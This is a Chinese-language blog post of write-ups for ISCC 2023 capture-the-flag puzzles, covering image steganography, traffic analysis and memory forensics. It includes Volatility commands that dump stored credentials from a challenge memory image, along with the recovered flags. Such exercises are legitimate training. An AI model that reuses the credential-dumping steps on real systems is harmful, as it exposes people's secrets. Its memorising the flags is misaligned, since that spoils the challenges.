<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="2023-ISCC, Jundex">
    <meta name="description" content="2023-ISCC练武题misc好看的维吾尔族小姐姐下载附件未知格式，放进010查看为png。

修改文件扩展名为png，得到一张图片。

明显感觉图片高度有问题，010调整图片高度，得到一张带有DM码的图片。

结合题目提示和DM码特点。">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>2023-ISCC | Jundex</title>
    <link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/Jundexu/Jundexu.github.io/favicon.png">
    
    <style>
        body{
            background-image: url(https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/202307311402829.jpg);
            background-repeat:no-repeat;
            background-size: 100% 100%;
            background-attachment:fixed;
        }
    </style>



    <!-- bg-cover style     -->



<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Jundexu/Jundexu.github.io/libs/awesome/css/all.min.css">
<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Jundexu/Jundexu.github.io/libs/materialize/materialize.min.css">
<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Jundexu/Jundexu.github.io/libs/aos/aos.css">
<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Jundexu/Jundexu.github.io/libs/animate/animate.min.css">
<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Jundexu/Jundexu.github.io/libs/lightGallery/css/lightgallery.min.css">
<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Jundexu/Jundexu.github.io/css/matery.css">
<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Jundexu/Jundexu.github.io/css/my.css">
<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Jundexu/Jundexu.github.io/css/dark.css" media="none" onload="if(media!='all')media='all'">




    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Jundexu/Jundexu.github.io/libs/tocbot/tocbot.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Jundexu/Jundexu.github.io/css/post.css">




    



    <script src="https://cdn.jsdelivr.net/gh/Jundexu/Jundexu.github.io/libs/jquery/jquery-3.6.0.min.js"></script>

<style type="text/css" lang="css">
    #loading-container{
        position: fixed;
        top: 0;
        left: 0;
        min-height: 100vh;
        width: 100vw;
        z-index: 9999;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        background: #FFF;
        text-align: center;
        /* loader页面消失采用渐隐的方式*/
        -webkit-transition: opacity 1s ease;
        -moz-transition: opacity 1s ease;
        -o-transition: opacity 1s ease;
        transition: opacity 1s ease;
    }
    .loading-image{
        width: 120px;
        height: 50px;
        transform: translate(-50%);
    }

    .loading-image div:nth-child(2) {
        -webkit-animation: pacman-balls 1s linear 0s infinite;
        animation: pacman-balls 1s linear 0s infinite
    }

    .loading-image div:nth-child(3) {
        -webkit-animation: pacman-balls 1s linear .33s infinite;
        animation: pacman-balls 1s linear .33s infinite
    }

    .loading-image div:nth-child(4) {
        -webkit-animation: pacman-balls 1s linear .66s infinite;
        animation: pacman-balls 1s linear .66s infinite
    }

    .loading-image div:nth-child(5) {
        -webkit-animation: pacman-balls 1s linear .99s infinite;
        animation: pacman-balls 1s linear .99s infinite
    }

   .loading-image div:first-of-type {
        width: 0;
        height: 0;
        border: 25px solid #49b1f5;
        border-right-color: transparent;
        border-radius: 25px;
        -webkit-animation: rotate_pacman_half_up .5s 0s infinite;
        animation: rotate_pacman_half_up .5s 0s infinite;
    }
    .loading-image div:nth-child(2) {
        width: 0;
        height: 0;
        border: 25px solid #49b1f5;
        border-right-color: transparent;
        border-radius: 25px;
        -webkit-animation: rotate_pacman_half_down .5s 0s infinite;
        animation: rotate_pacman_half_down .5s 0s infinite;
        margin-top: -50px;
    }
    @-webkit-keyframes rotate_pacman_half_up {0% {transform: rotate(270deg)}50% {transform: rotate(1turn)}to {transform: rotate(270deg)}}

    @keyframes rotate_pacman_half_up {0% {transform: rotate(270deg)}50% {transform: rotate(1turn)}to {transform: rotate(270deg)}}

    @-webkit-keyframes rotate_pacman_half_down {0% {transform: rotate(90deg)}50% {transform: rotate(0deg)}to {transform: rotate(90deg)}}

    @keyframes rotate_pacman_half_down {0% {transform: rotate(90deg)}50% {transform: rotate(0deg)}to {transform: rotate(90deg)}}

    @-webkit-keyframes pacman-balls {75% {opacity: .7}to {transform: translate(-100px, -6.25px)}}

    @keyframes pacman-balls {75% {opacity: .7}to {transform: translate(-100px, -6.25px)}}


    .loading-image div:nth-child(3),
    .loading-image div:nth-child(4),
    .loading-image div:nth-child(5),
    .loading-image div:nth-child(6){
        background-color: #49b1f5;
        width: 15px;
        height: 15px;
        border-radius: 100%;
        margin: 2px;
        width: 10px;
        height: 10px;
        position: absolute;
        transform: translateY(-6.25px);
        top: 25px;
        left: 100px;
    }
    .loading-text{
        margin-bottom: 20vh;
        text-align: center;
        color: #2c3e50;
        font-size: 2rem;
        box-sizing: border-box;
        padding: 0 10px;
        text-shadow: 0 2px 10px rgba(0,0,0,0.2);
    }
    @media only screen and (max-width: 500px) {
         .loading-text{
            font-size: 1.5rem;
         }
    }
    .fadeout {
        opacity: 0;
        filter: alpha(opacity=0);
    }
    /* logo出现动画 */
    @-webkit-keyframes fadeInDown{0%{opacity:0;-webkit-transform:translate3d(0,-100%,0);transform:translate3d(0,-100%,0)}100%{opacity:1;-webkit-transform:none;transform:none}}
    @keyframes fadeInDown{0%{opacity:0;-webkit-transform:translate3d(0,-100%,0);}}
 </style>
 <script>
(function () {
    const loaded = function(){
       setTimeout(function(){
            const loader = document.getElementById("loading-container");
            loader.className="fadeout" ;//使用渐隐的方法淡出loading page
            // document.getElementById("body-wrap").style.display="flex";
            setTimeout(function(){
                loader.style.display="none";
            },1000); 
        },1000);//强制显示loading page 1s  
    };
    loaded();
})()
 </script><meta name="generator" content="Hexo 6.3.0"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head>



 <div id="loading-container">
     <p class="loading-text">玩命加载中 . . . </p> 
     <div class="loading-image">
         <div></div>
         <div></div>
         <div></div>
         <div></div> 
         <div></div>
     </div>
 </div><body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="https://cdn.jsdelivr.net/gh/Jundexu/Jundexu.github.io/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">Jundex</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
  <li>
    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="https://cdn.jsdelivr.net/gh/Jundexu/Jundexu.github.io/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">Jundex</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        
    </ul>
</div>


        </div>

        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/Jundexu/Jundexu.github.io/medias/featureimages/16.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">2023-ISCC</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                          <div class="article-tag">
                            <span class="chip bg-color">无标签</span>
                          </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2023-06-13
                </div>
                

                

                

                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        

        
        <!-- 代码块折行 -->
        <style type="text/css">
            code[class*="language-"], pre[class*="language-"] { white-space: pre-wrap !important; }
        </style>
        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1 id="2023-ISCC练武题"><a href="#2023-ISCC练武题" class="headerlink" title="2023-ISCC练武题"></a>2023-ISCC练武题</h1><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="好看的维吾尔族小姐姐"><a href="#好看的维吾尔族小姐姐" class="headerlink" title="好看的维吾尔族小姐姐"></a>好看的维吾尔族小姐姐</h3><p>下载附件未知格式，放进010查看为png。</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-01%20112437.png"></p>
<p>修改文件扩展名为png，得到一张图片。</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-01%20112639.png"></p>
<p>明显感觉图片高度有问题，010调整图片高度，得到一张带有DM码的图片。</p>
<p><img src="C:\Users\wond\OneDrive\桌面\ISCC\attachment-1\古力娜扎1.png" alt="古力娜扎1"></p>
<p>结合题目提示和DM码特点。<a target="_blank" rel="noopener" href="https://www.keyence.com.cn/ss/products/auto_id/barcode_lecture/basic_2d/datamatrix/">什么是DM码</a></p>
<p>维吾尔文是从右向左横写，每个字母没有大写小写之分。但每个字母有不同的书写形式和书写规则。</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-01%20113142.png"></p>
<p>将图片镜像翻转，然后解码，<a target="_blank" rel="noopener" href="https://www.keyence.com.cn/ss/products/auto_id/barcode_lecture/basic_2d/datamatrix/">DM码在线解码</a></p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-01%20113416.png"></p>
<p>得到一串url码，很明显是倒序的将其倒序回来。<a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/zh/daoxu/">在线文本倒序</a></p>
<p>然后url解码<a target="_blank" rel="noopener" href="https://www.iamwawa.cn/urldecode.html">url在线解码</a> 得到ISCC{you_got_it_welldone!}</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-01%20113752.png"></p>
<h3 id="菜鸟黑客1"><a href="#菜鸟黑客1" class="headerlink" title="菜鸟黑客1"></a>菜鸟黑客1</h3><p>用 <a href="D:\r-studio(2)\r-studio">r-studio</a> 打开raw，发现flag.txt，得到密文DES{U2FsdGVkX19WerE&#x2F;OZodh7liigwc7fzf8eWqByR8ixxENEvPwPpWzm2EL2f90UXO}</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230522235149861.png" alt="image-20230522235149861"></p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230522235207585.png" alt="image-20230522235207585"></p>
<p>利用volatility爆破密码</p>
<p> <code>./volatility -f  &quot;Novice hacker.raw&quot; --profile=Win2008R2SP1x64 lsadump</code></p>
<p>得到ISCC2023</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230522235536671.png" alt="image-20230522235536671"></p>
<p>des解密,得到flag    ISCC{dbsy_cdis_fd7n_s4fd}</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230531191723034.png" alt="image-20230531191723034"></p>
<h3 id="菜鸟黑客2"><a href="#菜鸟黑客2" class="headerlink" title="菜鸟黑客2"></a>菜鸟黑客2</h3><p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230522233309945.png" alt="image-20230522233309945"></p>
<p>由提示可以搜索jpg 或者png，又看到emoji代表题目中的心情</p>
<p> <code>./volatility -f &quot;Novice hacker.raw&quot; --profile=Win2008R2SP1x64 filescan | findstr jpg</code></p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-22%20175726.png"></p>
<p>提取emoji.jpg</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./volatility -f  &quot;Novice hacker.raw&quot; --profile=Win2008R2SP1x64 dumpfiles -Q 0x000000007dfaff20 --dump-dir=./</span><br></pre></td></tr></table></figure>

<p>查看编辑信息</p>
<p><code>./volatility -f  &quot;Novice hacker.raw&quot; --profile=Win2008R2SP1x64  editbox</code></p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230522234012591.png" alt="image-20230522234012591"></p>
<p>注意眼睛，打开jpg，发现是睁眼闭眼emoji，推测可能是摩斯密码，闭眼一条线代表“ - ”，睁眼代表“ . ”</p>
<p>得到. – — .— .. .. … ..-. ..- -.，摩斯解码，得到EMOJIISFUN，试了试不是flag。</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230522234434425.png" alt="image-20230522234434425"></p>
<p>然后分离emoji图片得到一个压缩包，有密码，回想起之前菜鸟一的密码ISCC2023，成功解压得到txt</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230522234655038.png" alt="image-20230522234655038"></p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230522234839767.png" alt="image-20230522234839767"></p>
<p>打开txt，得到密文，结合之前的EMOJIISFUN作为密钥，得到flag  ISCC{afdf_buhi_pqwd_tfus}</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230522234903760.png" alt="image-20230522234903760"></p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230522235017673.png" alt="image-20230522235017673"></p>
<h3 id="消息传递"><a href="#消息传递" class="headerlink" title="消息传递"></a>消息传递</h3><p>解压得到一个字典和流量包</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230505214001173.png" alt="image-20230505214001173"></p>
<p>用wireshark打开流量包，搜索字符串iscc，追踪tcp流，发现picture.rar</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230505192650866.png" alt="image-20230505192650866"></p>
<p>base64转文件，得到rar，但需要密码，010查看没有线索。<a target="_blank" rel="noopener" href="https://tool.hiofd.com/base64-to-file-online/">在线base64转文件</a></p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230505192818101.png" alt="image-20230505192818101"></p>
<p>然后继续在wireshark找到了p2.png</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230505195620318.png" alt="image-20230505195620318"></p>
<p>base64转图片,打开发现什么都没有，010打开发现有两个png文件头,将第二个提取出来得到一张图片</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230505202045679.png" alt="image-20230505202045679"></p>
<p> 猜测可能有是解压密码结果不对。<img src="C:\Users\wond\OneDrive\桌面\ISCC\attachment-3\34b65afa-dfc6-4f83-8edb-d8841f7e3955_108h_BECh.png"></p>
<p>那么就是压缩密码由两段组成，在010查找各个文件的文本password或者pass，发现了两段疑似密码的字符串，不知道顺序自由组合为WRWAALIUWOHZAPQWFTQIPMVJFOKHHZUZ，即是解压密码。</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-05%20204834.png"></p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-05%20204851.png"></p>
<p>打开压缩包，发现里面是黑白图片，刚开始以为是二维码，但是112张，又想到有可能是二进制，白代表0，黑代表1，先试一试，第一行01001001，转字符串为I，第二行01010011</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230505205607249.png" alt="image-20230505205607249"></p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230505205655981.png" alt="image-20230505205655981"></p>
<p>第二行01010011，字符为S。以此类推得到ISCC{i2s0c2c3}</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230505205820237.png" alt="image-20230505205820237"></p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230505205748955.png" alt="image-20230505205748955"></p>
<p>以此类推得到ISCC{i2s0c2c3}，在根据所给的字典转换得到flag&#x3D;</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230505210322069.png" alt="image-20230505210322069"></p>
<h3 id="人生之路"><a href="#人生之路" class="headerlink" title="人生之路"></a>人生之路</h3><p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230511200315619.png" alt="image-20230511200315619"></p>
<p>下载附件，发现一张照片和压缩包</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230511200431118.png" alt="image-20230511200431118"></p>
<p>根据提示，成功的密码就在脚下，推测可能要修改图片高度，下面这是修改图片高度要用到的信息</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230511200256648.png" alt="image-20230511200256648"></p>
<h3 id="汤姆历险记"><a href="#汤姆历险记" class="headerlink" title="汤姆历险记"></a>汤姆历险记</h3><p>下载附件，得到一张图片和一个txt</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230516191935022.png" alt="image-20230516191935022"></p>
<p><img src="C:\Users\wond\OneDrive\桌面\ISCC\misc\汤姆历险记\attachment-35\Tom.jpg" alt="Tom"></p>
<p>将jpg放入010里查看，分析一堆像词频分析的字符串</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230516192137092.png" alt="image-20230516192137092"></p>
<p>词频分析后，发现它们按出现次数排序，组成了{yasuobpwrd91702!@$%^&amp;*}，也不是flag</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230516192258057.png" alt="image-20230516192258057"></p>
<p>推测jpg可能有压缩包，{yasuobpwrd91702!@$%^&amp;*}即为压缩包密码，用binwalk提取得到一个空白文档和压缩包。密码解压后，得到一篇文章。</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230516192504353.png" alt="image-20230516192504353"></p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230516192621285.png" alt="image-20230516192621285"></p>
<p>发现这篇各段要么单倍行距，要么1.5倍行距，推测可能是摩斯密码，即单倍行距为 . ，1.5倍行距为 - 。</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230516192827703.png" alt="image-20230516192827703"></p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230516192848455.png" alt="image-20230516192848455"></p>
<p>手动转换一下，然后摩斯解码。然后将字符串按照字典替换得到flag &#x3D; a7l6g4bg。</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230516193212389.png" alt="image-20230516193212389"></p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230516193646157.png" alt="image-20230516193646157"></p>
<h3 id="mystery-of-bits"><a href="#mystery-of-bits" class="headerlink" title="mystery of bits"></a>mystery of bits</h3><p>下载附件，一张图片和压缩包，图片明显高度不对。</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230524190411420.png" alt="image-20230524190411420"></p>
<p>脚本爆破图片原始高宽，1080x1080。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20000</span>):<span class="comment">#一般 20000就够</span></span><br><span class="line"></span><br><span class="line">  wide = struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>,i)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20000</span>):</span><br><span class="line"></span><br><span class="line">​    high = struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>,j)</span><br><span class="line"></span><br><span class="line">​    data = <span class="string">b&#x27;\x49\x48\x44\x52&#x27;</span> + wide+ high+<span class="string">b&#x27;\x08\x06\x00\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">​    \<span class="comment">#因为是 Py3，byte和str型不能直接进行运算，要写把 str写 b&#x27;...&#x27;。不然把 wide和 high写成 str(...)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">​    crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">​    <span class="keyword">if</span> crc32 == <span class="number">0xEC106C8F</span>: <span class="comment"># 0x------是这个 png文件头的 CRC校验码，在 21~25byte处</span></span><br><span class="line"></span><br><span class="line">​      <span class="built_in">print</span>(<span class="string">&#x27;\n\n&#x27;</span>,i,j,crc32)</span><br><span class="line"></span><br><span class="line">​      <span class="built_in">print</span>(<span class="built_in">type</span>(data))</span><br><span class="line"></span><br><span class="line">​      exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(i,end=<span class="string">&#x27; &#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230524190543212.png" alt="image-20230524190543212"></p>
<p>010修改高度后，放进stegslove打开，发现要横着看。</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230524190637585.png" alt="image-20230524190637585"></p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230524191334611.png" alt="image-20230524191334611"></p>
<p>横过来后，发现密码为ysafao245hfdisi</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230524191350648.png" alt="image-20230524191350648"></p>
<p>解压压缩包，得到一个wav文件，放进010发现 password:ISCC2023</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230524191533763.png" alt="image-20230524191533763"></p>
<p>stegpy解密得到一堆二进制，根据长度推测是31x31的二维码</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230524194107804.png" alt="image-20230524194107804"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">MAX = <span class="number">31</span></span><br><span class="line">img = Image.new(<span class="string">&quot;RGB&quot;</span>,(MAX, MAX))</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;0000000000000000000000000000000011111110101010111111101111111001000001011101011100000100000100101110101111000111110010111010010111010101000000101001011101001011101010110100101000101110100100000100010110000001010000010011111110101010101010101111111000000000010011001101000000000000010101101010101010111110111110011110000111111100010100101110000010111010010110110101101111000011100000011100000111000001110001001011101001011010010110100000000110100000111000001110000000001011101001011010010110100100010001101001100111011101010100001010011111010110011101001111100000011001100100001101100101000010100010011000010000011000100001011100001011001110110110100100101011100111110101111111101100000000000100001010110100010001001111111001000110010010101010000100000101101111001001000111110010111010011101110101111110101001011101010111011001101110101000101110100010111010101110111010010000010110011001000110011110001111111000010001000010010100000000000000000000000000000000000&quot;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0</span>,MAX):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0</span>,MAX):</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">str</span>[i] == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">            img.putpixel([x,y],(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            img.putpixel([x,y],(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">        i = i+<span class="number">1</span></span><br><span class="line">img.show()</span><br><span class="line">img.save(<span class="string">&quot;flag.png&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>得到二维码,扫描得到flag &#x3D; ISCC{congratulation_and_it_is_real}。</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230524194257379.png" alt="image-20230524194257379"></p>
<h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="JustDoIt"><a href="#JustDoIt" class="headerlink" title="JustDoIt"></a>JustDoIt</h3><p>查壳，无壳</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-03%20190618.png"></p>
<p>找到关键代码</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-03%20205257.png"></p>
<p>进入sub_487C91函数，得知flag的加密算法</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-03%20205525.png"></p>
<p>自己写得解密脚本</p>
